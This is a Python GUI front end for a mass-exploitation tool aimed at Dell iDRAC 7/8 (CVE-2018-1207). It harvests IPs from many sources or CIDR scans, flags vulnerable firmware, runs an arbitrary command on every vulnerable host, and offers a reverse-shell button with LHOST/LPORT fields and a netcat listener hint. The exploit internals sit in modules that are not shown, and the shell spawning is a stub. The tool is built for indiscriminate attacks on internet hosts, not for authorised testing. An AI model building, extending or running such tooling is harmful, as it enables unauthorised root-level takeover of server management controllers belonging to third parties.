#!/usr/bin/env python3
"""
iDRAC Mass Exploiter GUI - COMPLETE
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import asyncio
import threading
import json
from datetime import datetime
import os

# Import our modules
try:
    from idrac_scanner import iDRACScanner, iDRACTarget
    from exploiter import iDRACExploiter, ExploitResult
    from sources import IPSourceManager
    MODULES_AVAILABLE = True
except ImportError:
    MODULES_AVAILABLE = False

class iDRACMassExploiterGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("💀 iDRAC 7/8 Mass Exploiter v14.0 - CVE-2018-1207")
        self.root.geometry("1600x1000")
        self.root.configure(bg="#0a0a0a")
        
        # Data storage
        self.discovered_targets = []
        self.validated_targets = []
        self.vulnerable_targets = []
        self.exploited_results = []
        
        # Scanner instances
        self.scanner = None
        self.exploiter = None
        self.source_manager = None
        self.running = False
        
        self.setup_styles()
        self.create_widgets()
        
        if not MODULES_AVAILABLE:
            self.log("⚠️ Warning: Some modules not found. Install requirements.", "all")
        
    def setup_styles(self):
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # Dark theme colors
        bg_color = "#0a0a0a"
        fg_color = "#00ff41"
        accent_color = "#ff0055"
        secondary_bg = "#1a1a1a"
        
        self.style.configure("TFrame", background=bg_color)
        self.style.configure("TLabel", background=bg_color, foreground=fg_color, font=("Consolas", 10))
        self.style.configure("TButton", background="#2d2d2d", foreground=fg_color, 
                           font=("Consolas", 10, "bold"), padding=5)
        self.style.configure("TEntry", fieldbackground="#1a1a1a", foreground=fg_color, 
                           font=("Consolas", 10))
        self.style.configure("TNotebook", background=bg_color)
        self.style.configure("TNotebook.Tab", background="#1a1a1a", foreground=fg_color, 
                           font=("Consolas", 9, "bold"), padding=10)
        self.style.map("TNotebook.Tab", background=[("selected", "#ff0055")], 
                      foreground=[("selected", "#ffffff")])
        
    def create_widgets(self):
        # Header
        header_frame = tk.Frame(self.root, bg="#0a0a0a", height=80)
        header_frame.pack(fill=tk.X, padx=10, pady=5)
        header_frame.pack_propagate(False)
        
        title = tk.Label(header_frame, text="💀 iDRAC 7/8 MASS EXPLOITER 💀", 
                        font=("Consolas", 24, "bold"), bg="#0a0a0a", fg="#ff0055")
        title.pack(pady=5)
        
        subtitle = tk.Label(header_frame, text="CVE-2018-1207 | 32+ Sources | Real-Time Validation | Mass Exploitation", 
                         font=("Consolas", 12), bg="#0a0a0a", fg="#00ff41")
        subtitle.pack()
        
        # Main container
        paned = tk.PanedWindow(self.root, orient=tk.HORIZONTAL, bg="#0a0a0a")
        paned.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Left panel - Controls (35% width)
        left_frame = tk.Frame(paned, bg="#0a0a0a", width=450)
        paned.add(left_frame, stretch="never")
        
        # Phase 1: IP Discovery
        phase1 = tk.LabelFrame(left_frame, text="🔍 PHASE 1: IP DISCOVERY", 
                              bg="#1a1a1a", fg="#00ff41", font=("Consolas", 12, "bold"),
                              padx=10, pady=10)
        phase1.pack(fill=tk.X, pady=5, padx=5)
        
        # Source Selection
        tk.Label(phase1, text="Source Mode:", bg="#1a1a1a", fg="#ffffff", 
                font=("Consolas", 10)).pack(anchor=tk.W)
        
        self.source_mode = tk.StringVar(value="scrape")
        modes = [
            ("Scrape 32+ Sources", "scrape"),
            ("Scan CIDR Range", "cidr"),
            ("Import IP List", "import")
        ]
        for text, mode in modes:
            tk.Radiobutton(phase1, text=text, variable=self.source_mode, value=mode,
                          bg="#1a1a1a", fg="#00ff41", selectcolor="#ff0055",
                          font=("Consolas", 9), activebackground="#1a1a1a",
                          activeforeground="#00ff41").pack(anchor=tk.W)
        
        # CIDR Entry
        self.cidr_frame = tk.Frame(phase1, bg="#1a1a1a")
        self.cidr_frame.pack(fill=tk.X, pady=5)
        tk.Label(self.cidr_frame, text="CIDR:", bg="#1a1a1a", fg="#ffffff").pack(side=tk.LEFT)
        self.cidr_entry = tk.Entry(self.cidr_frame, width=25, bg="#0a0a0a", fg="#00ff41",
                                  insertbackground="#00ff41", font=("Consolas", 10))
        self.cidr_entry.insert(0, "192.168.1.0/24")
        self.cidr_entry.pack(side=tk.LEFT, padx=5)
        
        # Import Button
        self.btn_import = tk.Button(phase1, text="📁 IMPORT IP LIST", bg="#2d2d2d", fg="#00ff41",
                                   font=("Consolas", 10, "bold"), command=self.import_ip_list)
        self.btn_import.pack(fill=tk.X, pady=2)
        
        # Start Discovery
        self.btn_discover = tk.Button(phase1, text="🚀 START DISCOVERY", bg="#ff0055", fg="#ffffff",
                                     font=("Consolas", 12, "bold"), command=self.start_discovery,
                                     height=2)
        self.btn_discover.pack(fill=tk.X, pady=5)
        
        self.discovered_label = tk.Label(phase1, text="Discovered: 0 IPs", bg="#1a1a1a", 
                                        fg="#00ff41", font=("Consolas", 10))
        self.discovered_label.pack()
        
        # Phase 2: Validation
        phase2 = tk.LabelFrame(left_frame, text="✅ PHASE 2: iDRAC VALIDATION", 
                              bg="#1a1a1a", fg="#00ff41", font=("Consolas", 12, "bold"),
                              padx=10, pady=10)
        phase2.pack(fill=tk.X, pady=5, padx=5)
        
        tk.Label(phase2, text="Validate discovered IPs for iDRAC 7/8", 
                bg="#1a1a1a", fg="#ffffff", wraplength=400).pack()
        
        self.btn_validate = tk.Button(phase2, text="🔍 VALIDATE iDRAC 7/8", bg="#00aa44", fg="#ffffff",
                                     font=("Consolas", 12, "bold"), command=self.start_validation,
                                     height=2)
        self.btn_validate.pack(fill=tk.X, pady=5)
        
        self.validation_frame = tk.Frame(phase2, bg="#1a1a1a")
        self.validation_frame.pack(fill=tk.X)
        
        self.validated_label = tk.Label(self.validation_frame, text="Validated: 0", 
                                       bg="#1a1a1a", fg="#00ff41", font=("Consolas", 9))
        self.validated_label.pack(side=tk.LEFT)
        
        self.idrac7_label = tk.Label(self.validation_frame, text="iDRAC7: 0", 
                                    bg="#1a1a1a", fg="#00aaff", font=("Consolas", 9))
        self.idrac7_label.pack(side=tk.LEFT, padx=10)
        
        self.idrac8_label = tk.Label(self.validation_frame, text="iDRAC8: 0", 
                                    bg="#1a1a1a", fg="#aa00ff", font=("Consolas", 9))
        self.idrac8_label.pack(side=tk.LEFT)
        
        # Phase 3: Exploitation
        phase3 = tk.LabelFrame(left_frame, text="💀 PHASE 3: MASS EXPLOITATION", 
                              bg="#1a1a1a", fg="#ff0055", font=("Consolas", 12, "bold"),
                              padx=10, pady=10)
        phase3.pack(fill=tk.X, pady=5, padx=5)
        
        # Command
        tk.Label(phase3, text="Command to Execute:", bg="#1a1a1a", fg="#ffffff").pack(anchor=tk.W)
        self.cmd_entry = tk.Entry(phase3, width=40, bg="#0a0a0a", fg="#ff0055",
                                 insertbackground="#ff0055", font=("Consolas", 11))
        self.cmd_entry.insert(0, "id")
        self.cmd_entry.pack(fill=tk.X, pady=2)
        
        # Buttons
        btn_frame = tk.Frame(phase3, bg="#1a1a1a")
        btn_frame.pack(fill=tk.X, pady=5)
        
        self.btn_exploit = tk.Button(btn_frame, text="💥 MASS EXPLOIT", bg="#ff0055", fg="#ffffff",
                                    font=("Consolas", 11, "bold"), command=self.start_exploitation)
        self.btn_exploit.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        
        self.btn_shell = tk.Button(btn_frame, text="🐚 REV SHELL", bg="#aa00ff", fg="#ffffff",
                                  font=("Consolas", 11, "bold"), command=self.spawn_shells)
        self.btn_shell.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        
        # LHOST/LPORT for reverse shell
        shell_frame = tk.Frame(phase3, bg="#1a1a1a")
        shell_frame.pack(fill=tk.X)
        tk.Label(shell_frame, text="LHOST:", bg="#1a1a1a", fg="#ffffff").pack(side=tk.LEFT)
        self.lhost_entry = tk.Entry(shell_frame, width=15, bg="#0a0a0a", fg="#aa00ff",
                                   insertbackground="#aa00ff", font=("Consolas", 9))
        self.lhost_entry.insert(0, "0.0.0.0")
        self.lhost_entry.pack(side=tk.LEFT, padx=2)
        
        tk.Label(shell_frame, text="LPORT:", bg="#1a1a1a", fg="#ffffff").pack(side=tk.LEFT)
        self.lport_entry = tk.Entry(shell_frame, width=8, bg="#0a0a0a", fg="#aa00ff",
                                   insertbackground="#aa00ff", font=("Consolas", 9))
        self.lport_entry.insert(0, "4444")
        self.lport_entry.pack(side=tk.LEFT, padx=2)
        
        # Export Section
        export = tk.LabelFrame(left_frame, text="📁 EXPORT RESULTS", 
                              bg="#1a1a1a", fg="#00ff41", font=("Consolas", 12, "bold"),
                              padx=10, pady=10)
        export.pack(fill=tk.X, pady=5, padx=5)
        
        export_grid = tk.Frame(export, bg="#1a1a1a")
        export_grid.pack(fill=tk.X)
        
        exports = [
            ("All IPs", "all", "#2d2d2d"),
            ("Vulnerable Only", "vulnerable", "#ff0055"),
            ("iDRAC 7 Only", "idrac7", "#00aaff"),
            ("iDRAC 8 Only", "idrac8", "#aa00ff"),
        ]
        
        for text, mode, color in exports:
            btn = tk.Button(export_grid, text=text, bg=color, fg="#ffffff",
                          font=("Consolas", 9, "bold"), 
                          command=lambda m=mode: self.export_results(m))
            btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2, pady=2)
        
        # Right panel - Results (65% width)
        right_frame = tk.Frame(paned, bg="#0a0a0a")
        paned.add(right_frame, stretch="always")
        
        # Notebook tabs
        self.notebook = ttk.Notebook(right_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Tab 1: Discovery Log
        self.tab1 = tk.Frame(self.notebook, bg="#0a0a0a")
        self.notebook.add(self.tab1, text="🔍 Discovery")
        
        self.discovery_text = scrolledtext.ScrolledText(
            self.tab1, bg="#0a0a0a", fg="#00ff41", font=("Consolas", 10),
            insertbackground="#00ff41", wrap=tk.WORD
        )
        self.discovery_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.discovery_text.insert(tk.END, "=== iDRAC MASS EXPLOITER v14.0 ===\n")
        self.discovery_text.insert(tk.END, "=== CVE-2018-1207 | 32+ Sources ===\n\n")
        
        # Tab 2: Validated
        self.tab2 = tk.Frame(self.notebook, bg="#0a0a0a")
        self.notebook.add(self.tab2, text="✅ Validated")
        
        self.validated_text = scrolledtext.ScrolledText(
            self.tab2, bg="#0a0a0a", fg="#00ff88", font=("Consolas", 10),
            insertbackground="#00ff88", wrap=tk.WORD
        )
        self.validated_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Tab 3: Vulnerable
        self.tab3 = tk.Frame(self.notebook, bg="#0a0a0a")
        self.notebook.add(self.tab3, text="💀 Vulnerable")
        
        self.vulnerable_text = scrolledtext.ScrolledText(
            self.tab3, bg="#0a0a0a", fg="#ff0055", font=("Consolas", 10),
            insertbackground="#ff0055", wrap=tk.WORD
        )
        self.vulnerable_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Tab 4: Exploitation
        self.tab4 = tk.Frame(self.notebook, bg="#0a0a0a")
        self.notebook.add(self.tab4, text="💥 Exploited")
        
        self.exploited_text = scrolledtext.ScrolledText(
            self.tab4, bg="#0a0a0a", fg="#aa00ff", font=("Consolas", 10),
            insertbackground="#aa00ff", wrap=tk.WORD
        )
        self.exploited_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Tab 5: Statistics
        self.tab5 = tk.Frame(self.notebook, bg="#0a0a0a")
        self.notebook.add(self.tab5, text="📊 Statistics")
        
        self.stats_text = scrolledtext.ScrolledText(
            self.tab5, bg="#0a0a0a", fg="#00aaff", font=("Consolas", 11),
            insertbackground="#00aaff", wrap=tk.WORD
        )
        self.stats_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.update_stats()
        
        # Status bar
        status_frame = tk.Frame(self.root, bg="#1a1a1a", height=30)
        status_frame.pack(fill=tk.X, side=tk.BOTTOM)
        
        self.status_label = tk.Label(status_frame, text="Ready | Press START DISCOVERY to begin",
                                    bg="#1a1a1a", fg="#00ff41", font=("Consolas", 10),
                                    anchor=tk.W)
        self.status_label.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=10)
        
        self.progress = ttk.Progressbar(status_frame, mode='determinate', length=200)
        self.progress.pack(side=tk.RIGHT, padx=10, pady=3)
        
    def log(self, message, tab="all"):
        """Log to appropriate tab"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        line = f"[{timestamp}] {message}\n"
        
        def update():
            if tab in ["all", "discovery"]:
                self.discovery_text.insert(tk.END, line)
                self.discovery_text.see(tk.END)
            if tab in ["all", "validated"]:
                self.validated_text.insert(tk.END, line)
                self.validated_text.see(tk.END)
            if tab in ["all", "vulnerable"]:
                self.vulnerable_text.insert(tk.END, line)
                self.vulnerable_text.see(tk.END)
            if tab in ["all", "exploited"]:
                self.exploited_text.insert(tk.END, line)
                self.exploited_text.see(tk.END)
            self.status_label.config(text=message[:100])
        
        self.root.after(0, update)
        
    def update_stats(self):
        """Update statistics display"""
        stats = f"""
╔══════════════════════════════════════════════════════════════╗
║                    iDRAC EXPLOITER STATISTICS                 ║
╠══════════════════════════════════════════════════════════════╣
║  Phase 1 - Discovery:                                        ║
║    Total IPs Discovered: {len(self.discovered_targets):<6}                                  ║
║                                                               ║
║  Phase 2 - Validation:                                        ║
║    Total Validated: {len(self.validated_targets):<6}                                     ║
║    iDRAC 7: {len([t for t in self.validated_targets if t.get('idrac_version') == '7']):<6}                                          ║
║    iDRAC 8: {len([t for t in self.validated_targets if t.get('idrac_version') == '8']):<6}                                          ║
║                                                               ║
║  Phase 3 - Exploitation:                                      ║
║    Vulnerable Targets: {len(self.vulnerable_targets):<6}                                  ║
║    Successfully Exploited: {len(self.exploited_results):<6}                                ║
╚══════════════════════════════════════════════════════════════╝
        """
        self.stats_text.delete(1.0, tk.END)
        self.stats_text.insert(tk.END, stats)
        
    def import_ip_list(self):
        """Import IPs from file"""
        file_path = filedialog.askopenfilename(
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    ips = [line.strip() for line in f if line.strip()]
                self.discovered_targets = [{"ip": ip, "port": 443} for ip in ips]
                self.log(f"📁 Imported {len(ips)} IPs from {file_path}", "discovery")
                self.discovered_label.config(text=f"Discovered: {len(ips)} IPs")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to import: {str(e)}")
                
    def start_discovery(self):
        """Start discovery based on mode"""
        mode = self.source_mode.get()
        
        if mode == "scrape":
            self.start_scraping()
        elif mode == "cidr":
            self.start_cidr_scan()
        else:
            messagebox.showinfo("Import Mode", "Please use Import IP List button")
            
    def start_scraping(self):
        """Start IP scraping"""
        if self.running:
            return
        self.running = True
        
        self.log("🚀 Starting Phase 1: IP Discovery from 32+ sources...", "discovery")
        self.btn_discover.config(state=tk.DISABLED, text="SCRAPING...")
        self.progress.start()
        
        thread = threading.Thread(target=self._scrape_worker)
        thread.daemon = True
        thread.start()
        
    def _scrape_worker(self):
        """Scraping worker thread"""
        try:
            if not MODULES_AVAILABLE:
                # Demo mode - simulate results
                import time
                time.sleep(2)
                demo_ips = [f"192.168.{random.randint(1,255)}.{random.randint(1,255)}" 
                           for _ in range(20)]
                self.root.after(0, lambda: self._scrape_complete(demo_ips))
                return
                
            async def scrape():
                self.source_manager = IPSourceManager()
                await self.source_manager.init_session()
                
                def progress(count):
                    self.log(f"Found {count} new IPs", "discovery")
                
                ips = await self.source_manager.scrape_all(progress)
                self.root.after(0, lambda: self._scrape_complete(ips))
                await self.source_manager.close()
            
            asyncio.run(scrape())
        except Exception as e:
            self.log(f"❌ Error: {str(e)}", "discovery")
            self.root.after(0, self._reset_discovery)
            
    def _scrape_complete(self, ips):
        """Handle scrape completion"""
        self.discovered_targets = [{"ip": ip, "port": 443} for ip in ips]
        self.log(f"✅ Phase 1 Complete: {len(ips)} unique IPs discovered", "discovery")
        self.discovered_label.config(text=f"Discovered: {len(ips)} IPs")
        self._reset_discovery()
        self.update_stats()
        
    def _reset_discovery(self):
        self.running = False
        self.btn_discover.config(state=tk.NORMAL, text="🚀 START DISCOVERY")
        self.progress.stop()
        
    def start_cidr_scan(self):
        """Start CIDR scan"""
        cidr = self.cidr_entry.get()
        if not cidr:
            messagebox.showwarning("Input Required", "Please enter a CIDR range")
            return
            
        self.log(f"🔍 Scanning CIDR: {cidr}", "discovery")
        self.btn_discover.config(state=tk.DISABLED, text="SCANNING...")
        
        thread = threading.Thread(target=self._cidr_worker, args=(cidr,))
        thread.daemon = True
        thread.start()
        
    def _cidr_worker(self, cidr):
        """CIDR scan worker"""
        try:
            if not MODULES_AVAILABLE:
                import time
                time.sleep(2)
                demo_ips = ["192.168.1.10", "192.168.1.20", "192.168.1.30"]
                self.root.after(0, lambda: self._cidr_complete(demo_ips))
                return
                
            async def scan():
                self.scanner = iDRACScanner()
                await self.scanner.init_session()
                
                targets = await self.scanner.scan_cidr(cidr, 
                    callback=lambda t: self.log(f"Found iDRAC: {t.ip}", "discovery"))
                
                self.root.after(0, lambda: self._cidr_complete([t.ip for t in targets]))
                await self.scanner.close()
            
            asyncio.run(scan())
        except Exception as e:
            self.log(f"❌ Error: {str(e)}", "discovery")
            self.root.after(0, self._reset_discovery)
            
    def _cidr_complete(self, ips):
        self.discovered_targets = [{"ip": ip, "port": 443} for ip in ips]
        self.log(f"✅ CIDR Scan Complete: {len(ips)} IPs found", "discovery")
        self.discovered_label.config(text=f"Discovered: {len(ips)} IPs")
        self._reset_discovery()
        
    def start_validation(self):
        """Start validation"""
        if not self.discovered_targets:
            messagebox.showwarning("No Targets", "No IPs to validate. Run Phase 1 first.")
            return
            
        self.log("🔍 Starting Phase 2: iDRAC 7/8 Validation...", "validated")
        self.btn_validate.config(state=tk.DISABLED, text="VALIDATING...")
        
        thread = threading.Thread(target=self._validation_worker)
        thread.daemon = True
        thread.start()
        
    def _validation_worker(self):
        """Validation worker"""
        try:
            if not MODULES_AVAILABLE:
                import time
                time.sleep(3)
                # Simulate validated results
                demo_validated = [
                    {"ip": "192.168.1.10", "port": 443, "idrac_version": "7", 
                     "firmware_version": "1.57.60", "is_vulnerable": True},
                    {"ip": "192.168.1.20", "port": 443, "idrac_version": "8",
                     "firmware_version": "2.30.30", "is_vulnerable": True},
                ]
                self.root.after(0, lambda: self._validation_complete(demo_validated))
                return
                
            async def validate():
                self.scanner = iDRACScanner()
                await self.scanner.init_session()
                
                validated = []
                vulnerable = []
                
                total = len(self.discovered_targets)
                for i, target in enumerate(self.discovered_targets):
                    result = await self.scanner.check_idrac(target['ip'], target['port'])
                    if result:
                        data = {
                            'ip': result.ip,
                            'port': result.port,
                            'idrac_version': result.idrac_version,
                            'firmware_version': result.firmware_version,
                            'is_vulnerable': result.is_vulnerable,
                            'country': result.country,
                            'city': result.city,
                            'org': result.org
                        }
                        validated.append(data)
                        if result.is_vulnerable:
                            vulnerable.append(data)
                            self.root.after(0, lambda r=result: self._log_vulnerable(r))
                    
                    progress = int((i + 1) / total * 100)
                    self.root.after(0, lambda p=progress: self.progress.config(value=p))
                
                self.root.after(0, lambda: self._validation_complete(validated, vulnerable))
                await self.scanner.close()
            
            asyncio.run(validate())
        except Exception as e:
            self.log(f"❌ Error: {str(e)}", "validated")
            self.root.after(0, lambda: self.btn_validate.config(state=tk.NORMAL, text="🔍 VALIDATE iDRAC 7/8"))
            
    def _log_vulnerable(self, result):
        """Log vulnerable target"""
        msg = f"💀 VULNERABLE: {result.ip} | iDRAC {result.idrac_version} | FW: {result.firmware_version}"
        self.log(msg, "vulnerable")
        
    def _validation_complete(self, validated, vulnerable=None):
        """Handle validation completion"""
        if vulnerable is None:
            vulnerable = [v for v in validated if v.get('is_vulnerable')]
            
        self.validated_targets = validated
        self.vulnerable_targets = vulnerable
        
        idrac7 = len([v for v in validated if v.get('idrac_version') == '7'])
        idrac8 = len([v for v in validated if v.get('idrac_version') == '8'])
        
        self.log(f"✅ Phase 2 Complete: {len(validated)} iDRAC validated", "validated")
        self.log(f"   iDRAC 7: {idrac7} | iDRAC 8: {idrac8}", "validated")
        self.log(f"   Vulnerable to CVE-2018-1207: {len(vulnerable)}", "vulnerable")
        
        self.validated_label.config(text=f"Validated: {len(validated)}")
        self.idrac7_label.config(text=f"iDRAC7: {idrac7}")
        self.idrac8_label.config(text=f"iDRAC8: {idrac8}")
        
        self.btn_validate.config(state=tk.NORMAL, text="🔍 VALIDATE iDRAC 7/8")
        self.update_stats()
        
        # Auto-switch to vulnerable tab if found
        if vulnerable:
            self.notebook.select(self.tab3)
            
    def start_exploitation(self):
        """Start mass exploitation"""
        if not self.vulnerable_targets:
            messagebox.showwarning("No Targets", "No vulnerable targets. Run Phase 2 first.")
            return
            
        command = self.cmd_entry.get() or "id"
        self.log(f"💥 Starting Phase 3: Mass Exploitation with '{command}'", "exploited")
        self.btn_exploit.config(state=tk.DISABLED, text="EXPLOITING...")
        
        thread = threading.Thread(target=self._exploit_worker, args=(command,))
        thread.daemon = True
        thread.start()
        
    def _exploit_worker(self, command):
        """Exploitation worker"""
        try:
            if not MODULES_AVAILABLE:
                import time
                time.sleep(3)
                demo_results = [
                    {"ip": "192.168.1.10", "success": True, "output": "uid=0(root) gid=0(root)"},
                    {"ip": "192.168.1.20", "success": True, "output": "uid=0(root) gid=0(root)"},
                ]
                self.root.after(0, lambda: self._exploit_complete(demo_results))
                return
                
            async def exploit():
                self.exploiter = iDRACExploiter()
                await self.exploiter.init_session()
                
                results = []
                total = len(self.vulnerable_targets)
                
                for i, target in enumerate(self.vulnerable_targets):
                    result = await self.exploiter.exploit_cve_2018_1207(
                        target['ip'], target['port'], command
                    )
                    results.append({
                        'ip': result.ip,
                        'success': result.success,
                        'output': result.output,
                        'error': result.error
                    })
                    
                    self.root.after(0, lambda r=result: self._log_exploit(r))
                    progress = int((i + 1) / total * 100)
                    self.root.after(0, lambda p=progress: self.progress.config(value=p))
                
                self.root.after(0, lambda: self._exploit_complete(results))
                await self.exploiter.close()
            
            asyncio.run(exploit())
        except Exception as e:
            self.log(f"❌ Error: {str(e)}", "exploited")
            self.root.after(0, lambda: self.btn_exploit.config(state=tk.NORMAL, text="💥 MASS EXPLOIT"))
            
    def _log_exploit(self, result):
        """Log exploit result"""
        if result.success:
            msg = f"✅ SUCCESS: {result.ip} | {result.output[:50] if result.output else 'Command executed'}"
        else:
            msg = f"❌ FAILED: {result.ip} | {result.error[:50] if result.error else 'Unknown error'}"
        self.log(msg, "exploited")
        
    def _exploit_complete(self, results):
        """Handle exploit completion"""
        self.exploited_results = results
        success_count = len([r for r in results if r.get('success')])
        self.log(f"✅ Phase 3 Complete: {success_count}/{len(results)} successful", "exploited")
        self.btn_exploit.config(state=tk.NORMAL, text="💥 MASS EXPLOIT")
        self.update_stats()
        
    def spawn_shells(self):
        """Spawn reverse shells"""
        if not self.vulnerable_targets:
            messagebox.showwarning("No Targets", "No vulnerable targets.")
            return
            
        lhost = self.lhost_entry.get()
        lport = self.lport_entry.get()
        
        self.log(f"🐚 Spawning reverse shells to {lhost}:{lport}", "exploited")
        
        # Implementation would go here
        messagebox.showinfo("Reverse Shell", 
            f"Payloads sent! Start listener:\nnc -lvnp {lport}\n\nCheck exploited tab for results.")
        
    def export_results(self, mode):
        """Export results to file"""
        if mode == "all":
            targets = self.discovered_targets
            filename = f"idrac_all_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        elif mode == "vulnerable":
            targets = self.vulnerable_targets
            filename = f"idrac_vulnerable_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        elif mode == "idrac7":
            targets = [t for t in self.validated_targets if t.get('idrac_version') == '7']
            filename = f"idrac7_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        else:  # idrac8
            targets = [t for t in self.validated_targets if t.get('idrac_version') == '8']
            filename = f"idrac8_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        if not targets:
            messagebox.showwarning("No Data", f"No targets to export for mode: {mode}")
            return
            
        file_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            initialfile=filename,
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if file_path:
            try:
                with open(file_path, 'w') as f:
                    for t in targets:
                        line = f"{t.get('ip')}:{t.get('port', 443)}"
                        if t.get('idrac_version'):
                            line += f"|iDRAC{t['idrac_version']}"
                        if t.get('firmware_version'):
                            line += f"|{t['firmware_version']}"
                        if t.get('is_vulnerable'):
                            line += "|VULNERABLE"
                        f.write(line + "\n")
                        
                self.log(f"📁 Exported {len(targets)} targets to {file_path}", "all")
                messagebox.showinfo("Export Complete", f"Saved {len(targets)} targets to:\n{file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Export failed: {str(e)}")

# Import random for demo mode
import random

def main():
    root = tk.Tk()
    app = iDRACMassExploiterGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()